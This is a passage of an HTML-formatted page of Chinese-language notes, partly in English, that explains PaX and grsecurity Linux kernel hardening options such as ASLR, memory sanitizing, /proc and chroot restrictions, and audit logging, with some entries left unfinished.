MPROTECT completely on certain binaries reduces the security benefit of PaX,所以这个选项用来使会出现问题的这类环境恢复到old behavior】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Allow ELF text relocations (read help) (Executable and Linking Format，ELF，可执行文件)&lt;/strong&gt; 【(PAX_ELFRELOCS)Non-executable pages and mprotect()的限制对阻止新的可执行代码进入攻击任务的地址空间很有用。 There remain only two venues for this kind of attack:if the attacker can execute already existing code in the attacked task then he can either have it create and mmap() a file containing his code or have it mmap() an already existing ELF library that does not have position independent code in it and use mprotect() on it to make it writable and copy his code there.  While protecting against the former approach is beyond PaX, the latter can be prevented by having only PIC ELF libraries on one’s system (which do not need to relocate their code).&lt;em&gt;（如果攻击者可以执行在攻击任务中已存在的代码，那他可以创建它并mmap（）到一个包含他的代码的文件 或者 把它mmap（）到一个已存在的没有独立位置的代码的ELF库并且使用mprotect（）使其变得可写入并把他的代码复制进去？）&lt;/em&gt;。  如果你确定这跟你的情况相似，因为所有现代Linux发行版都有这个情况，让这个选项禁用——这里应该选否。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable kernel pages&lt;/strong&gt; 【该选项相当于内核态的mprotect和pageexec。启用这个选项将使在系统区中注入和外来代码的执行更加困难。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Return Address Instrumentation Method&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;—-&amp;gt;bts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;—-&amp;gt;or&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;address-space-layout-randomization&quot;&gt;Address Space Layout Randomization(地址空间随机化)&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Address Space Layout Randomization&lt;/strong&gt; 【（PAX_ASLR）接下来的选项会让内核在特定的程序部分采取随机化，因此强迫攻击者在众多的情况中猜测程序的位置。在允许内核检测这类意图并回应它的前提下，任何一个失败的猜测都很可能导致被攻击的程序崩溃。启用这个选项你可以选择随机化下面的区域：1、 top of the task’s kernel stack；2、 top of the task’s userland stack；3、 base address for mmap() requests that do not specify one(this includes all libraries)；4、 base address of the main executable。强烈建议打开这个选项，因为它提供有效的保护且损失性能的可以忽略不计。  Note：可以使用chpax和paxctl控制每个可执行程序的该特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize kernel stack base&lt;/strong&gt; 【（PAX_RANDKSTACK）启用这个选项将随机化每一个任务的每一个系统调用内核栈。强迫攻击者猜测，且能防止他利用有关的可能已经泄露的信息。注意，一旦kernel stack紧缺，可能导致堆栈溢出，所以你要认真测试你的系统。  一旦在内核配置中启用这个选项，基于这个特性的文件将无法禁用这个特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize user stack and mmap() base&lt;/strong&gt; 【（PAX_RANDUSTACK）user stack：内核随机化每一个任务的用户栈。随机化过程分为两步，第二步将采用大量的栈顶移位，从而导致程序需要大量的内存（如果SEGMEXEC未被启用将超过2.5G，如果启用了将为1.25G）。  因为这个原因，在每个基于这个特性的文件第二步可以被chpax和paxctl控制。】【（PAX_RANDMMAP）mmap，内存映射机制。如果选是，mmap()请求将不自己指定地址，内核将为之使用基于随机的地址。结果是所有动态加载的库将在一个随机的地址出现，并因此使攻击者执行library code的意图更困难。 Furthermore, if a program is relinked as a dynamic ELF file, its base address will be randomized as well, completing the full randomization of the address space layout.  攻击这样的程序将变成一个猜测游戏。】&lt;/p&gt;

&lt;h4 id=&quot;miscellaneous-hardening-features&quot;&gt;Miscellaneous hardening features(杂项优化）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sanitize all freed memory （清除已释放内存）&lt;/strong&gt; 【一旦内存被释放，内核将清除内存页和slab对象（Linux下的一种内存分配机制）。这可以轮流减少存储数据的生命周期，避免密码等敏感数据在内存太长时间。对运行时间短的进程尤其有好处,long lived processes and the kernel itself benefit from this as long as they ensure timely freeing of memory that may hold sensitive information.作为交易，这可能对性能有所影响，在单CPU系统中内核编译可能会慢3%，部署该选项前最好在工作负荷下测试一下性能损失。要注意这个特性不会保护存储在仍然存活的内存页中的数据】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sanitize kernel stack&lt;/strong&gt; 【内核将在系统调用返回前清除内核栈,这会减少内核栈leak bug泄露的信息。这同样会造成性能损耗，最好在工作环境下测试一下。完整的特性需要GCC插件的支持，例如GCC4.5或更新的版本。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Forcibly initialize local variables copied to userland(对复制到用户态的局部变量进行强制初始化)&lt;/strong&gt; 【内核将对一些被复制到用户态的局部变量进行0初始化操作。The tradeoff is less performance impact than PAX_MEMORY_STACKLEAK at a much smaller coverage.  This in turn prevents unintended information leakage from the kernel stack should later code forget to explicitly set all parts of the copied variable.完整的特性需要GCC插件的支持】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent invalid userland pointer dereference（阻止间接引用不合法的用户态指针）&lt;/strong&gt; 【在只允许内核指针的环境下内核将阻止间接引用用户态指针，这是一个有用的运行时debugging feature和阻止渗透内核bugs的一个安全方法。作为交换，一些虚拟化措施将遭受到可观的延迟，因此如果内核将运行在这类环境上你应该禁用这个特性。一个给定虚拟环境是否会受到影响最好通过一些简单的测试再决定。性能损耗将会在开机的时候最为明显。一个重要的准则是虚拟机运行在没有硬件虚拟化支持的CPU上会很可能遭到这类延迟。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various kernel object reference counter overflows(阻止各类内核对象引用计数器溢出)&lt;/strong&gt; 【内核会检查并阻止溢出的各类（但不是全部）对象引用计数器。作为交易，被溢出引用计数机制保护的数据结构将不会被释放，从而导致内存泄露。需要注意到的是即使没有这种保护，这种泄露也会发生。但是那样的话，泄露出的大量数据会最终引发数据结构的freeing（&lt;em&gt;//解释为内存释放还是数据自由？&lt;/em&gt;）, 即使这种数据结构正在被用于别处的时候。这会最终导致这个特性所阻止的渗透的情况的发生。鉴于该特性对性能损耗微乎其微，建议启用这个特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Automatically constify eligible structures （自动常量化符合条件的结构)&lt;/strong&gt; 【the compiler will automatically constify a class of types that contain only function pointers.它减少了内核的受攻击面并产生了更好的内存配置。此特性需要GCC4.5及以上。要注意的是，如果一些代码不得不修改已常量化的变量，那源代码将作为补丁才能被使用。 Examples can be found in PaX itself (the no_const attribute) and for some out-of-tree modules at http://www.grsecurity.net/~paxguy1/ .】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden heap object copies between kernel and userland （加固用户与内核之间堆对象的拷贝）&lt;/strong&gt; 【内核会限制堆对象的大小，当它们被在内核态和用户态之间的目录拷贝时。这种检查防止在内核向用户拷贝时造成内核堆的信息泄露，并且防止在用户向内核拷贝时造成内核堆溢出。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various integer overflows in function size parameters&lt;/strong&gt; 【选择这个选项内核会重新计算被标记为size_overflow特征的具有双精度整数的函数参数的表达式。The recomputed argument is checked against TYPE_MAX and an event is logged on overflow and the triggering process is killed.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Generate some entropy during boot and runtime （在开机和运行时生成一些无序状态量（平均信息量））&lt;/strong&gt; 【选择这个选项内核会利用某些内核代码从原始以及手动产生的程序状态中提取无序状态量This will help especially embedded（嵌入式） systems where there is little ‘natural’ source of entropy normally. The cost is some slowdown of the boot process and fork（分岔） and irq（中断请求） processing.注意这个提取entropy的方法不是密码级别的安全】&lt;/p&gt;

&lt;h3 id=&quot;memory-protections&quot;&gt;Memory Protections（内存保护）&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny reading/writing to /dev/kmem, /dev/mem, and /dev/port&lt;/strong&gt; 【（GRKERNSEC_KMEM）如果你启用这个选项，在运行的内核上/dev/kmem和/dev/mem将无法读写，/dev/port也将不允许被打开。/dev/cpu/*/msr和kexec的支持将被删除。If you have module support disabled, enabling this will close up six ways that are currently used to insert malicious code（恶意代码） into the running kernel.就算这个特性被启用，我们依然高度建议你使用RBAC系统，因为攻击者仍然可能通过鲜为人知的代码修改运行的内核。启用这个选项会阻止cpupower和powertop工具的运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable privileged I/O&lt;/strong&gt; 【（kernel.grsecurity.disable_priv_io）启用这个选项，所有ioperm和iopl调用都会返回error。不幸的是一些程序需要这个通道来正确地运行，最著名的是XFree86 and hwclock。hwclock可以通过内核的RTC（real-time clock)支持补救，所以如果这个选项启用，那RTC也将可用，用来保证hwclock正确运行。如果你正使用XFree86或Xorg2012或更早的版本，你可能导致无法使用图形界面，在这种情况下你应该使用RBAC系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden BPF JIT against spray attacks&lt;/strong&gt; 【（GRKERNSEC_JIT_HARDEN）？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable unprivileged PERF_EVENTS usage by default&lt;/strong&gt; 【sysctl中的/proc/sys/kernel/perf_event_paranoid取值范围将被允许扩大，并且的得到一个新的默认值3。当sysctl被设置成这个值时，对PERF_EVENTS系统调用接口没有权限的使用将被允许。虽然PERF_EVENTS能被合法地用来管理性能和低等级应用分析，但是这建立在强制忽略配置上，是一些漏洞的原因所在，也为边缘途径和信息泄露产生新的机会。这个特性将PERF_EVENTS设置为一个默认的安全状态，并且如果有不具备权限的程序分析需要，允许管理员暂时更改它的值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Insert random gaps between thread stacks（在线程栈中插入随机间隙）&lt;/strong&gt; 【（GRKERNSEC_RAND_THREADSTACK）一个随机大小的间隙将会强制插入已分配的线程栈中。Glibc’s NPTL and other threading libraries that pass MAP_STACK to the kernel for thread stack allocation are supported.这个implements目前为间隙提供8位的平均信息。Many distributions do not compile threaded remote services with the -fstack-check argument to GCC, causing the variable-sized stack-based allocator, alloca(), to not probe the stack on allocation. 这将允许一个无界限alloca()来跳过所有保护页面，潜在并有把握地修改其他的线程栈。一个强制随机的间隙可以降低这类攻击的可靠性and increases the chance that such a read/write to another thread’s stack instead lands in an unmapped area,导致崩溃并触发Grsecurity的anti-bruteforcing（反暴力破解）逻辑。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden ASLR against information leaks and entropy reduction （加强ASLR来抵御信息泄露和平均状态量减少）&lt;/strong&gt; 【（GRKERNSEC_PROC_MEMMAP）如果启用这个特性，并且Pax中的依赖随机地址特性在任务中被启用，那/proc//maps和/proc//stat文件将不再给出地址映射信息。另外还将清除这些信息并禁用那些危险源的信息。this option causes reads of sensitive /proc/ entries（条目） where the file descriptor（描述子） was opened in a different task than the one performing the read.这类意图将会被记录。This option also limits argv/env strings for suid/sgid binaries to 512KB to prevent a complete exhaustion of the stack entropy provided by ASLR. Finally, it places an 8MB stack resource limit on suid/sgid binaries to prevent alternative mmap layouts from being abused.】【如果你使用Pax，启用这个选项至关重要，因为它关闭了许多让完整的ASLR局部失效的漏洞】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent kernel stack overflows&lt;/strong&gt; 【（GRKERNSEC_KSTACKOVERFLOW）内核的进程栈将使用vmalloc来进行分配，而不是内核默认的分配器。This introduces guard pages that in combination with the alloca checking of the STACKLEAK feature prevents all forms of kernel process stack overflow abuse.要注意这个特性与内核栈缓存溢出不一样.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter exploit bruteforcing（阻止暴力破解）&lt;/strong&gt; 【（GRKERNSEC_BRUTE， kernel.grsecurity.deter_bruteforce）启动这个选项，尝试暴力破解分支后台进程如apche和sshd以及suid/sgid下的二进制文件的意图都会被阻止。当一个forking deamon的子进程被Pax或因为一个不合法的操作或其他可疑信号杀死、崩溃时，（the parent process will be delayed 30 seconds upon every subsequent fork）父进程将在之后的每个分支延迟30秒，直到管理员能评定这个情况并重启这个后台程序。 在suid/sgid方面，这个意图会被记录，the user has all their existing instances of the suid/sgid binary terminated，并在15分钟内不能执行任何suid/sgid的二进制程序。 建议你在审计部分开启信号记录使得每当进程触发可疑信号时就生成记录。 如果sysctl选项可用，一个名为”deter_bruteforce”的选项会被生成。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden module auto-loading（模板自动加载的加固）&lt;/strong&gt; 【（GRKERNSEC_MODHARDEN）module auto-loading in response to use of some feature implemented by an unloaded module will be restricted to root users。Enabling this option helps defend against attacks by unprivileged users who abuse（滥用） the auto-loading behavior to cause a vulnerable（有漏洞的） module to load that is then exploited. 如果这个选项阻止了非root用户合理的自动加载，管理员可以通过使用警告日志中提到的准确的模块的名字手动执行模块。另外，管理员可以通过修改init脚本添加模块到开机模块加载列表中去。 拥有加密home目录支持的ubuntu服务器可能更需要对init脚本的修改，as the first non-root user logging in will cause the ecb(aes), ecb(aes)-all, cbc(aes), and cbc(aes)-all modules to be loaded.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel symbols&lt;/strong&gt; 【（GRKERNSEC_HIDESYM）启用这个选项，users with CAP_SYS_MODULE通过系统调用从已加载的模块中获得信息和显示所有内核标志的操作将被限制。由于软件的兼容性的原因，root用户对/proc/kallsyms目录将会被限制。RBAC系统将会隐藏entry（条目？入口？），即使是针对root用户。 该选项同样通过/proc一些条目防止内核地址的泄露。 要注意，当且仅当遇到下列情况时，该选项才会起作用：1、内核正使用的Grsecurity没有被一些发行版预先编译过了；2、你还应该同时启用了GRKERNSEC_DMESG特性；3、你正使用RBAC系统并且隐藏其他文件，例如kernel image and System.map。除此之外，启用这个选项将获得在编译时改变/boot, /lib/modules, and the kernel source这些目录的许可，以防止非root用户查看。  如果以上的情况都符合，这个选项将有助于对局部内核可利用溢出和任意读写漏洞（local kernel exploitation of overflows and arbitrary read/write vulnerabilities）提供有用的保护。 强烈建议你再此之外启用GRKERNSEC_PERF_HARDEN特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize layout of sensitive kernel structures （敏感内核结构的随机配置）&lt;/strong&gt; 【（GRKERNSEC_RANDSTRUCT）许多敏感内核结构（如task, fs, cred, etc)和all structures composed entirely of function pointers (aka “ops” structs)的配置将在编译的时候被随机化。This can introduce the requirement of an additional infoleak vulnerability for exploits targeting these structure types.		使用这个选项会产生一些性能损耗，轻微地增加内存使用，并且阻止取证工具（forensic tools）如Volatility的使用（除非内核资源树在内核安装完后没有清除。		编译的种子放在tools/gcc/randomize_layout_seed.h中。这在一个允许的make clean命令后会保留下来，用来使用先用的种子来编译external modules，并且可以通过make mrproper或make distclean被删除。】&lt;/p&gt;

&lt;p&gt;**Use cacheline-aware structure randomization ** 【（GRKERNSEC_RANDSTRUCT_PERFORMANCE）If you say Y here, the RANDSTRUCT randomization will make a best effort at restricting randomization to cacheline-sized groups of elements. It will further not randomize bitfields in structures. This reduces the performance hit of RANDSTRUCT at the cost of weakened randomization.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Active kernel exploit response&lt;/strong&gt; 【（GRKERNSEC_KERN_LOCKOUT）启用这个选项，当一个Pax警告触发，原因是可疑的内核活动(from KERNEXEC/UDEREF/USERCOPY)或因为bad memory accesses导致一个OOPS（意外？？）发生，我们将使用一下两个措施中的一个，而不是直接终止攻击进程(and potentially allowing a subsequent（后来的） exploit from the same user)：1如果用户是root，we will panic the system；2、如果用户不是root，我们会记录这个行为，终止该用户的所有进程，然后在系统重启前阻止他们创建任何新进程。This deters repeated kernel exploitation/bruteforcing attempts and is useful for later forensics.】&lt;/p&gt;

&lt;h3 id=&quot;role-based-access-control-options&quot;&gt;Role Based Access Control Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Disable RBAC system&lt;/strong&gt; 【（GRKERNSEC_NO_RBAC）如果这里选是，/dev/grsec设备将从内核中删除，来阻止RBAC系统生效。		应该仅在你不打算使用RBAC时才选Yes，以防止当可加载的模块支持并且/dev/[k]mem已被锁定时，攻击者通过错误使用的RBAC系统使用root权限来隐藏文件或进程。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel processes&lt;/strong&gt; 【（GRKERNSEC_ACL_HIDEKERN）如果这里选是，除了有”view hidden processes”标志的subject，所有内核线程将对所有进程隐藏。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Maximum tries before password lockout （最大密码尝试次数）&lt;/strong&gt; 【（GRKERNSEC_ACL_MAXTRIES）这个选项强制设定用户在Grsecurity RBAC系统中认证自己的最大次数，超过特定次数将被拒绝再次认证。数字越小，密码越难被暴力破解。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Time to wait after max password tries, in seconds&lt;/strong&gt; 【（GRKERNSEC_ACL_TIMEOUT）这个选项指定用户在RABC系统认证失败达最大次数后必须等待的时间。数字越大，密码越难被暴力破解。】&lt;/p&gt;

&lt;h3 id=&quot;filesystem-protections&quot;&gt;Filesystem Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Proc restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC）如果选是，/proc文件系统的访问权限将会改变，以加强系统安全和隐私。你必须在用户限制和用户及用户组限制中选择一个。根据你的选择，你可以把用户限制在只能查看自己运行的进程，或choose a group that can view all processes and files normally restricted to root if you choose the “restrict to user only” option. 		注意，如果你以非root身份运行identd或者ntpd（网络时间校正协议(network time protocol daemon)），你必须在你指定的组里运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict /proc to user only&lt;/strong&gt; 【（GRKERNSEC_PROC_USER）如果选是，非root用户将只能查看他们自己的进程，并且会被禁止查看网络相关的信息、内核标志和模块信息。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Allow special group&lt;/strong&gt; 【（GRKERNSEC_PROC_USERGROUP）如果选是，你可以选择一个组，这个组将可以查看所有进程的信息以及网络相关的信息。如果你启用了GRKERNSEC_HIDESYM选项，内核的标志信息可能依旧对这个组隐藏。 如果你想以非root身份运行identd，这将很有帮助。 你选择的组也可以在开机时通过”grsec_proc_gid=”在内核命令行选择。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() GID for special group&lt;/strong&gt; 【（GRKERNSEC_PROC_GID）设置这个GID决定那个组将可以避免Grsecurity对/proc的限制，允许该特殊组的用户查看网络数据和其他用户进程的存在信息。该GID也可以在开机时通过”grsec_proc_gid=”参数在内核命令行设定。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Additional restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC_ADD）如果选是，/proc将会添加附加的限制来阻止用户查看device和slabinfo信息（因为这些信息对exploits（渗透？）很有用）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Linking restrictions&lt;/strong&gt; 【（GRKERNSEC_LINK、kernel.grsecurity.linking_restrictions）如果选是，race exploits将被阻止，因为在可写+t（world-write +t)的目录下（如/tmp)用户将不能再跟踪其他用户的符号链接，除非符号链接的所有者也是目录的所有者。 用户同样无法硬链接到不属于他们的文件上。如果sysctl被启用，一个名为”linking_restrictions”的sysctl选项被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt;* 【？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;（）GID for users with kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt; 【】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FIFO restrictions&lt;/strong&gt; 【（GRKERNSEC_FIFO、kernel.grsecurity.fifo_restrictions） users will not be able to write to FIFOs they don’t own in world-writable +t directories (e.g. /tmp), unless the owner of the FIFO is the same owner of the directory it’s held in.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sysfs/debugfs restriction&lt;/strong&gt; 【（GRKERNSEC_SYSFS_RESTRICT）如果选是，在这个限制下正常挂载的sysfs以及所有在该目录下的文件系统都只能被root访问。		这些文件系统通常会提供硬件信息和调试信息的访问入口，然而这些信息却不适合被没有权限的用户看见。因为sysfs和debugfs也是一个潜在漏洞的最大的信息源ranging from infoleaks to local compromise.There has been very little oversight with an eye toward security involved in adding new exporters of information to these filesystems,所以不建议使用这些文件系统。 	因为兼容性的原因，一些目录对非root用户的访问提供了白名单：/sys/fs/selinux、/sys/fs/fuse、/sys/devices/system/cpu】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Runtime read-only mount protection&lt;/strong&gt; 【（GRKERNSEC_ROFS、kernel.grsecurity.romount_protect）如果选是，一个名为“romount_protect”的sysctl选项被产生。在运行时将这个选项设为1，文件系统将会获得如下保护：1、不允许新的可写入的加载的文件系统；2、现有的只读加载的文件系统不能被重新加载为可读可写；3、所有设备区块的写入选项都会被拒绝。 This option acts independently of grsec_lock: once it is set to 1, it cannot be turned off.		因此，如果该选项在只读系统的初始化脚本中被启用，请留意resulting behavior。		Also be aware that as with other root-focused features, GRKERNSEC_KMEM and GRKERNSEC_IO should be enabled and module loading disabled via config or at runtime.这个特性主要面向安全嵌入式系统（secure embedded systems）。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Eliminate stat/notify-based device sidechannels(（排除基于 进程状态/通知 的设备旁道攻击）&lt;/strong&gt; 【（GRKERNSEC_DEVICE_SIDECHANNEL）If you say Y here, timing analyses on block or character devices like /dev/ptmx using stat or inotify/dnotify/fanotify will be thwarted for unprivileged users. If a process without CAP_MKNOD stats such a device, the last access and last modify times will match the device’s create time. No access or modify events will be triggered through inotify/dnotify/fanotify for such devices。This feature will prevent attacks that may at a minimum allow an attacker to determine the administrator’s password length.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chroot jail restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT）如果选是，你可以选择多个选项使突破chroot的限制更困难。如果在这些选项下没有不兼容的软件，建议你把每个都打开。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny mounts&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MOUNT、kernel.grsecurity.chroot_deny_mount）如果选是，在chroot下的进程将不能再挂载或重新挂载文件系统】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny double-chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_DOUBLE、kernel.grsecurity.chroot_deny_chroot）如果选是，在chroot下的进程不能再一次使用chroot。因为这个操作是打破chroot限制的普遍方法，不应该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny pivot_root in chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_PIVOT、kernel.grsecurity.chroot_deny_pivot）如果选是，在chroot下的进程将不能使用pivot_root()方法，它就像会改变root文件系统的chroot in一样。这个方法可能在已经chroot的进程中被错误地使用来试图打破chroot限制，因此不该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Enforce chdir(“/“) on all chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHDIR、kernel.grsecurity.chroot_enforce_chdir）如果选是，所有刚刚chroot的应用的当前工作目录都会被设定到chroot的根目录下。 因为目前所知这个特性不妨碍任何软件，建议你在这里选是。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Deny (f)chmod +s&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHMOD、kernel.grsecurity.chroot_deny_chmod）如果选是，在chroot下的进程将不能对文件使用chmod和fchmod来使它们具有SUID或SGID位。这特性保护chroot不被其他已公布的方法打破。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny fchdir and fhandle out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FCHDIR、kernel.grsecurity.chroot_deny_fchdir）如果选是，一个非常有名的打破chroot限制的方法将会被阻止，这个方法是fchdir’ing to a file descriptor of the chrooting process that points to a directory outside the filesystem.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny mknod&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MKNOD、kernel.grsecurity.chroot_deny_mknod）如果选是，在chroot下的进程将不能使用mknod命令。   在chroot使用mknod的问题是：这将允许攻击者生成一个device entry，就像在物理层次上获得你系统的root权限，which could range from anything from the console device to a device for your harddrive(which they could then use to wipe the drive or steal data).  建议选是，除非你运行的软件不兼容。	 如果sysctl可用，一个名为”chroot_deny_mknod”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny shmat() out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SHMAT、kernel.grsecurity.chroot_deny_shmat）如果选是，在chroot下的进程将不能连接到在chroot jail外创建的共享内存段。  建议在这里选是。 如果sysctl可用，一个名为”chroot_deny_shmat”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny access to abstract AF_UNIX sockets out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_UNIX、kernel.grsecurity.chroot_deny_unix）如果选是，在chroot下的进程将不能连接到限制在chroot外部的abstract（表示不属于一个文件系统） Unix domain sockets.  建议选是。  如果sysctl可用，一个名为”chroot_deny_unix”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Protect outside processes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FINDTASK、kernel.grsecurity.chroot_findtask）如果选是，在chroot下的进程将不能杀死chroot外的进程，不能使用fcntl, ptrace, capget, getpgid, setpgid, getsid向chroot外的进程发送信号，不能查看chroot外的任何进程。	如果sysctl可用，一个名为”chroot_findtask”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict priority changes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_NICE、kernel.grsecurity.chroot_restrict_nice）如果选是，chroot下的进程将不能提升chroot下进程的优先级，或改变chroot外面的进程的优先级。	这个选项比从进程的能力设定中简单地删除CAP_SYS_NICE提供了更高的安全型。	如果sysctl可用，一个名为”chroot_restrict_nice”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny sysctl writes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SYSCTL、kernel.grsecurity.chroot_deny_sysctl）如果选是，在chroot下的攻击者将不能对sysctl的条目进行写入操作，不管是通过sysctl(2)还是通过/proc的接口。		强烈建议你在这个地方选是。如果sysctl可用，一个名为”chroot_sysctl”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Capability restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CAPS、kernel.grsecurity.chroot_caps）如果选是，在chroot jail下的所有进程的性能都会被降低到关闭以下功能：模块插入、raw I/O、系统和网络服务管理、重启系统、修改immutable文件、修改其他用户的IPC和改变系统时间。留下这个选项是因为它可能破坏某些应用。如果你的chroot下的应用执行这些任务时出现了问题，那请禁用这个选项。如果sysctl可用，一个名为”chroot_caps”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exempt initrd tasks from restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_INITRD）如果选是，先前为了初始化而启动的tasks将可以免除Grsecurity的chroot限制。This option is mainly meant to resolve Plymouth’s performing privileged operations unnecessarily in a chroot.】&lt;/p&gt;

&lt;h3 id=&quot;kernel-auditing&quot;&gt;Kernel Auditing&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Single group for auditing&lt;/strong&gt; 【（GRKERNSEC_AUDIT_GROUP、kernel.grsecurity.audit_gid、kernel.grsecurity.audit_group）如果选是,the exec and chdir logging features将只在你选定的组里面运作。	如果你只是想看特定的用户而不是系统大量的logs，这个选项建议启用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID for auditing&lt;/strong&gt; 【GRKERNSEC_AUDIT_GID】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exec logging&lt;/strong&gt; 【（GRKERNSEC_EXECLOG、kernel.grsecurity.exec_logging）如果选是，所有execve()调用都会被记录。对shell-servers的好处是保持对用户的跟踪。		如果sysctl可用，一个名为”exec_logging”的选项将被创建。	警告：这个选项启用时会产生大量的日志，特别是在活动的系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource logging&lt;/strong&gt; 【（GRKERNSEC_RESLOG、kernel.grsecurity.resource_logging）如果选是，所有超越resource限制的意图都将随着resource的名字、请求资源的大小和目前的限制被记录。高度建议你在这里选Y。如果sysctl可用，一个名为”resource_logging”的选项将被创建。如果RBAC系统也可用，这个sysctl选项的值将被忽略。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Log execs within chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_EXECLOG、kernel.grsecurity.chroot_execlog）如果选是，在chroot中的所有执行都将被记录在syslog上。如果特定的程序已安装在系统上，这会产生大量的日志。  因此留下了这个选项。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ptrace logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_PTRACE、kernel.grsecurity.audit_ptrace）如果选是，所有通过ptrace连接进程的意图都将被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chdir logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_CHDIR、kernel.grsecurity.audit_chdir）如果选是，所有chdir()调用都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(Un)Mount logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_MOUNT、kernel.grsecurity.audit_mount）如果选是，所有挂载和卸载都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Signal logging&lt;/strong&gt; 【（GRKERNSEC_SIGNAL、kernel.grsecurity.signal_logging）如果选是，特定的重要信息（如SIGSEGV）将被记录，当进程发生一个错误时它会作为一个结果通知你，这在一定程度上可能意味着a possible exploit attempt。】&lt;/p&gt;

